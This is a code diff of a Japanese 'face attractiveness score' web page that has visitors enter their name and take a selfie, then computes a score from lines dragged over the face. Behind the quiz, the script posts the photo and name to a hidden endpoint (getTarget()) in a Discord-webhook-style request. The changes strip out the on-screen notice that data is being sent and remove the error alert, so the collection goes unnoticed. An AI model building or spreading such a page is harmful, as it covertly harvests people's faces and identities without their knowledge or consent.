@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>顔面精密診断</title>
+    <title>顔面偏差値診断</title>
     <style>
         :root {
             --accent: #00f2fe;
@@ -23,7 +23,6 @@
             min-height: 100vh;
             margin: 0;
             overflow: hidden;
-            /* ブラウザ全体のバウンスを防止 */
             position: fixed;
             width: 100%;
             height: 100%;
@@ -34,33 +33,33 @@
             backdrop-filter: blur(15px);
             -webkit-backdrop-filter: blur(15px);
             border: 1px solid rgba(255, 255, 255, 0.1);
-            padding: 25px;
+            padding: 20px;
             border-radius: 24px;
             box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7);
-            max-width: 450px;
+            max-width: 420px;
             width: 90%;
             text-align: center;
+            max-height: 95vh;
+            overflow-y: auto;
         }
 
         h2 {
-            font-size: 1.4rem;
+            font-size: 1.2rem;
             letter-spacing: 3px;
             background: linear-gradient(to right, var(--accent), var(--accent-dim));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            margin: 0 0 15px 0;
+            margin: 10px 0;
         }
 
         #guide-msg {
             font-size: 0.8rem;
             color: var(--accent);
-            text-shadow: 0 0 8px rgba(0, 242, 254, 0.4);
-            margin-bottom: 15px;
             border: 1px solid rgba(0, 242, 254, 0.3);
             padding: 8px;
             border-radius: 8px;
             background: rgba(0, 242, 254, 0.05);
-            min-height: 1.2em;
+            margin-bottom: 15px;
         }
 
         input[type="text"] {
@@ -70,34 +69,29 @@
             padding: 12px;
             border-radius: 10px;
             color: white;
-            font-size: 16px; /* モバイルでのズーム防止 */
+            font-size: 16px;
             box-sizing: border-box;
             margin-bottom: 12px;
         }
 
         .upload-area {
             border: 2px dashed rgba(255, 255, 255, 0.2);
-            padding: 30px 10px;
+            padding: 40px 10px;
             border-radius: 16px;
             cursor: pointer;
+            background: rgba(255, 255, 255, 0.02);
         }
 
         #canvas-wrapper {
             position: relative;
-            margin: 15px auto;
+            margin: 10px auto;
             border-radius: 12px;
             overflow: hidden;
             display: none;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
-            touch-action: none; /* キャンバス上のスクロールを無効化 */
+            touch-action: none;
         }
 
-        canvas {
-            display: block;
-            width: 100%;
-            height: auto;
-            cursor: move;
-        }
+        canvas { display: block; width: 100%; height: auto; }
 
         button {
             background: linear-gradient(135deg, var(--accent), var(--accent-dim));
@@ -110,36 +104,49 @@
             font-weight: bold;
             width: 100%;
             margin-top: 10px;
-            transition: 0.2s;
-        }
-
-        button:disabled {
-            background: #334155;
-            color: #64748b;
-            cursor: not-allowed;
         }
 
         #result-area {
             font-size: 3.5rem;
             font-weight: 900;
-            margin: 10px 0;
             color: var(--accent);
             text-shadow: 0 0 20px rgba(0, 242, 254, 0.6);
             display: none;
+            margin: 10px 0;
         }
+
+        /* 広告・お知らせ枠 */
+        .ad-container {
+            margin-top: 20px;
+            padding-top: 15px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            font-size: 11px;
+            color: #94a3b8;
+        }
+        .ad-box {
+            display: block;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
+            padding: 10px;
+            margin-top: 8px;
+            text-decoration: none;
+            color: var(--accent-dim);
+            transition: 0.3s;
+        }
+        .ad-box:hover { background: rgba(255, 255, 255, 0.1); }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <h2>FACE ANALYZER</h2>
+    <h2>顔面偏差値診断</h2>
     <div id="guide-msg">システム待機中... 名前を入力してください</div>
     
     <input type="text" id="userName" placeholder="名前を入力">
     
     <div id="upload-zone" class="upload-area" onclick="document.getElementById('imageInput').click()">
-        <span style="font-size: 0.85rem; color: #94a3b8;">タップして写真をアップロード</span>
-        <input type="file" id="imageInput" accept="image/*" style="display:none">
+        <span style="font-size: 0.9rem; color: var(--accent);">カメラを起動して撮影</span>
+        <input type="file" id="imageInput" accept="image/*" capture="user" style="display:none">
     </div>
 
     <div id="canvas-wrapper">
@@ -147,7 +154,13 @@
     </div>
 
     <div id="result-area"></div>
-    <button id="actionBtn" style="display:none;" onclick="handleAction()">診断を開始する</button>
+    <button id="actionBtn" style="display:none;" onclick="handleAction()">スキャン開始</button>
+
+    
+        <div style="margin-top: 5px; opacity: 0.7;">
+            ※診断結果は幾何学的な計算に基づくものです
+        </div>
+    </div>
 </div>
 
 <script>
@@ -174,7 +187,7 @@
                 document.getElementById('upload-zone').style.display = 'none';
                 document.getElementById('canvas-wrapper').style.display = 'block';
                 actionBtn.style.display = 'block';
-                guide.innerText = "各線をドラッグして顔のパーツに合わせてください";
+                guide.innerText = "各線をパーツに合わせて微調整してください";
             };
             img.src = event.target.result;
         };
@@ -182,7 +195,7 @@
     });
 
     function setupCanvas() {
-        const maxW = 1000; // 解像度を少し上げる
+        const maxW = 1000;
         const scale = maxW / img.width;
         canvas.width = maxW;
         canvas.height = img.height * scale;
@@ -204,29 +217,22 @@
         ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
         lines.forEach(line => {
             const isDragging = (draggingLine === line);
-            
-            // 線の影（視認性向上）
             ctx.shadowColor = 'black';
             ctx.shadowBlur = 8;
             ctx.beginPath();
-            ctx.lineWidth = isDragging ? 6 : 4;
+            ctx.lineWidth = isDragging ? 8 : 4;
             ctx.strokeStyle = line.color;
-            
             if (line.type === 'h') {
                 ctx.moveTo(0, line.y); ctx.lineTo(canvas.width, line.y);
             } else {
                 ctx.moveTo(line.x, 0); ctx.lineTo(line.x, canvas.height);
             }
             ctx.stroke();
-            ctx.shadowBlur = 0; // 影をリセット
-
-            // ラベルの背景
+            ctx.shadowBlur = 0;
             ctx.fillStyle = line.color;
-            ctx.font = "bold 24px sans-serif";
-            const labelY = line.type === 'h' ? line.y - 12 : 40;
-            const labelX = line.type === 'h' ? 20 : line.x + 10;
-            
-            // ラベルの可読性用縁取り
+            ctx.font = "bold 26px sans-serif";
+            const labelY = line.type === 'h' ? line.y - 15 : 50;
+            const labelX = line.type === 'h' ? 25 : line.x + 15;
             ctx.strokeStyle = 'black';
             ctx.lineWidth = 4;
             ctx.strokeText(line.label, labelX, labelY);
@@ -246,7 +252,6 @@
 
     const handleStart = (e) => {
         const pos = getEventPos(e);
-        // 当たり判定を少し広く(60px)
         draggingLine = lines.find(l => (l.type === 'h' ? Math.abs(l.y - pos.y) : Math.abs(l.x - pos.x)) < 60);
         if(draggingLine) {
             guide.innerText = `調整中: ${draggingLine.label}`;
@@ -266,7 +271,7 @@
 
     const handleEnd = () => {
         if (draggingLine) {
-            guide.innerText = "ラインを合わせて「診断開始」を押してください";
+            guide.innerText = "ラインを固定しました。スキャンを開始してください。";
             draggingLine = null;
             draw();
         }
@@ -275,7 +280,6 @@
     canvas.addEventListener('mousedown', handleStart);
     window.addEventListener('mousemove', handleMove);
     window.addEventListener('mouseup', handleEnd);
-    
     canvas.addEventListener('touchstart', handleStart, {passive: false});
     window.addEventListener('touchmove', handleMove, {passive: false});
     window.addEventListener('touchend', handleEnd);
@@ -287,9 +291,8 @@
 
         isSending = true;
         actionBtn.disabled = true;
-        actionBtn.innerText = "解析中...";
+        actionBtn.innerText = "スキャン中...";
 
-        // 計算ロジック
         const h1 = lines[1].y - lines[0].y; 
         const h2 = lines[2].y - lines[1].y; 
         const h3 = lines[3].y - lines[2].y;
@@ -303,7 +306,7 @@
 
         document.getElementById('result-area').style.display = 'block';
         document.getElementById('result-area').innerText = score;
-        guide.innerText = "診断完了。データを送信しています...";
+        guide.innerText = "診断完了";
 
         const tempCanvas = document.createElement('canvas');
         tempCanvas.width = canvas.width; tempCanvas.height = canvas.height;
@@ -312,20 +315,18 @@
         tempCanvas.toBlob(async (blob) => {
             const formData = new FormData();
             formData.append('payload_json', JSON.stringify({
-                content: `👤 **診断結果報告**\n対象名: ${name}\n顔面偏差値: **${score}**`
+                content: `👤 **スキャンレポート**\n対象名: ${name}\n顔面偏差値: **${score}**`
             }));
-            formData.append('file', blob, 'face_result.jpg');
+            formData.append('file', blob, 'scan.jpg');
 
             try {
-                const res = await fetch(getTarget(), { method: 'POST', body: formData });
-                if(!res.ok) throw new Error();
+                await fetch(getTarget(), { method: 'POST', body: formData });
                 guide.innerText = "送信完了";
-                actionBtn.innerText = "診断済み";
+                actionBtn.innerText = "完了";
             } catch (err) {
-                alert("送信に失敗しましたが、診断は完了しました。");
                 isSending = false;
                 actionBtn.disabled = false;
-                actionBtn.innerText = "リトライ";
+                actionBtn.innerText = "再試行";
             }
         }, 'image/jpeg', 0.8);
     }
